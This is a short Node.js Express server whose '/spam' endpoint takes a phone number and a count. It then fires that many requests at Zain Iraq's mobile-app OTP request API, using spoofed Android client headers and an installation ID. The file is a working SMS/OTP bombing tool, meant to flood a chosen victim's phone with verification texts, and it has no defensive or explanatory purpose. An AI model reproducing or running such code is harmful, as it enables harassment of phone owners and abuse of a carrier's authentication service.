const express = require("express");
const axios = require("axios");
const app = express();
const PORT = process.env.PORT || 3000;
app.get( "/", ( req, res ) => {
    res.send("hi im run in cpu 4 hhhh");
})
app.get( "/spam",async ( req, res ) => {
    const num = req.query.num;
    const hh = req.query.hh;
    if(!num || !hh) {
        return res.status(403).json({
            status: 403
        })
    }
    try {
   let data = JSON.stringify({
  "msisdn": num
});

let config = {
  method: 'POST',
  url: 'https://mw-mobileapp.iq.zain.com/api/otp/request',
 headers: {
    'User-Agent': 'okhttp/4.11.0',
    'Connection': 'Keep-Alive',
    'Accept-Encoding': 'gzip',
    'Content-Type': 'application/json',
    'Skel-Accept-Language': 'en',
    'Skel-Platform': 'Android',
    'Skel-OS-Version': '13',
    'Skel-Fix-Version': '6.2.6',
    'Skel-Installation-Id': '95c6b9d38ad23442f2a5888817006a21fa3ed909',
    'Content-Type': 'application/json; charset=UTF-8',
  },
  data: data
};
        let arr = [];
for(i=0; i<hh; ++i) {
 let x = await axios.request(config);
 arr.push(`${i+1} ¦ Done: ${x.data.status}`);
  }
    res.json(arr)
    } catch (e) {
        res.status(500).json({
            err: "cant spam num"
        })
    }
})

app.listen( PORT, () => {
    console.log("IM RANNING IN PORT: ", PORT);
})
